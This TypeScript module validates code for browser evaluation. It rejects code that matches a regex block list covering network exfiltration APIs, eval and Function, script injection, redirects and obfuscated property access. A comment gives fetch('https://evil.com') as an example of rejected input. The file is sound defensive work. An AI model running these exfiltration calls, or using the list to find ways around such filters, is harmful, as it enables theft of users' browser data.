/**
 * Security validation for browser evaluation code.
 *
 * This module blocks dangerous JavaScript patterns that could be used to
 * exfiltrate data from the browser context. The validation uses pattern
 * matching since we cannot rely on AST parsing for code that may be
 * intentionally malformed.
 *
 * @see VULN-037: Unsafe eval() in Browser Evaluation Functions
 */

/**
 * Patterns that are blocked for security reasons.
 * Each pattern has a regex and a descriptive reason for error messages.
 */
const BLOCKED_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  // Network exfiltration - fetch, XHR, WebSocket, etc.
  {
    pattern: /\bfetch\s*\(/,
    reason: "fetch() is blocked for security - could exfiltrate sensitive data",
  },
  {
    pattern: /\bXMLHttpRequest\b/,
    reason: "XMLHttpRequest is blocked for security - could exfiltrate sensitive data",
  },
  {
    pattern: /\bWebSocket\b/,
    reason: "WebSocket is blocked for security - could exfiltrate sensitive data",
  },
  {
    pattern: /\bsendBeacon\b/,
    reason: "sendBeacon is blocked for security - could exfiltrate sensitive data",
  },
  {
    pattern: /\bEventSource\b/,
    reason: "EventSource is blocked for security - could exfiltrate sensitive data",
  },
  {
    pattern: /\bRTCPeerConnection\b/,
    reason: "RTCPeerConnection is blocked for security - could exfiltrate data via WebRTC",
  },

  // Code execution / module loading
  {
    pattern: /\beval\s*\(/,
    reason: "eval() is blocked for security - arbitrary code execution",
  },
  {
    pattern: /\bFunction\s*\(/,
    reason: "Function() constructor is blocked for security - arbitrary code execution",
  },
  {
    pattern: /\bnew\s+Function\b/,
    reason: "new Function() is blocked for security - arbitrary code execution",
  },
  {
    pattern: /\bimport\s*\(/,
    reason: "Dynamic import() is blocked for security - could load malicious modules",
  },
  {
    pattern: /\bimportScripts\b/,
    reason: "importScripts is blocked for security - could load malicious scripts",
  },

  // Node.js context escape attempts
  {
    pattern: /\brequire\s*\(/,
    reason: "require() is blocked for security - could access Node.js modules",
  },
  {
    pattern: /\bprocess\b/,
    reason: "process is blocked for security - could access Node.js environment",
  },

  // DOM manipulation for exfiltration
  {
    pattern: /createElement\s*\(\s*['"`]script['"`]\s*\)/,
    reason: "createElement('script') is blocked for security - could inject malicious scripts",
  },
  {
    pattern: /\bnew\s+Image\b/,
    reason: "new Image() is blocked for security - could exfiltrate data via image src",
  },

  // Location-based exfiltration
  {
    pattern: /\blocation\s*=/,
    reason: "Setting location = is blocked for security - could redirect to exfiltrate data",
  },
  {
    pattern: /\blocation\.href\s*=/,
    reason: "Setting location.href = is blocked for security - could redirect to exfiltrate data",
  },
  {
    pattern: /\blocation\.assign\s*\(/,
    reason: "location.assign() is blocked for security - could redirect to exfiltrate data",
  },
  {
    pattern: /\blocation\.replace\s*\(/,
    reason: "location.replace() is blocked for security - could redirect to exfiltrate data",
  },
  {
    pattern: /\bwindow\.open\s*\(/,
    reason: "window.open() is blocked for security - could open attacker-controlled pages",
  },
  {
    pattern: /\bopen\s*\(\s*['"`]/,
    reason: "open() with URL is blocked for security - could open attacker-controlled pages",
  },

  // Computed property access (obfuscation attempts like window['fetch'])
  {
    pattern: /\[\s*['"`][a-zA-Z]+['"`]\s*\]\s*\(/,
    reason:
      "computed property access with function call is blocked for security - could bypass identifier blocklist",
  },
  {
    pattern: /\[\s*`[^`]+`\s*\]\s*\(/,
    reason:
      "computed property access with template literal is blocked for security - could bypass identifier blocklist",
  },
  {
    pattern: /\[\s*['"][^'"]+['"]\s*\+/,
    reason:
      "computed property access with concatenation is blocked for security - could bypass identifier blocklist",
  },
];

/**
 * Validates JavaScript code intended for browser evaluation.
 *
 * This function blocks dangerous patterns that could be used to:
 * - Exfiltrate cookies, localStorage, sessionStorage, or DOM content
 * - Execute arbitrary code via eval() or Function constructor
 * - Load external scripts or modules
 * - Redirect the page to attacker-controlled URLs
 *
 * @param code - The JavaScript code string to validate
 * @throws Error if the code contains blocked patterns
 *
 * @example
 * // Safe - allowed
 * validateBrowserEvalCode("() => document.title");
 *
 * // Dangerous - throws
 * validateBrowserEvalCode("fetch('https://evil.com')");
 */
export function validateBrowserEvalCode(code: string): void {
  if (!code || typeof code !== "string") {
    return;
  }

  const normalizedCode = code.trim();
  if (!normalizedCode) {
    return;
  }

  for (const { pattern, reason } of BLOCKED_PATTERNS) {
    if (pattern.test(normalizedCode)) {
      throw new Error(`Browser eval validation failed: ${reason}`);
    }
  }
}
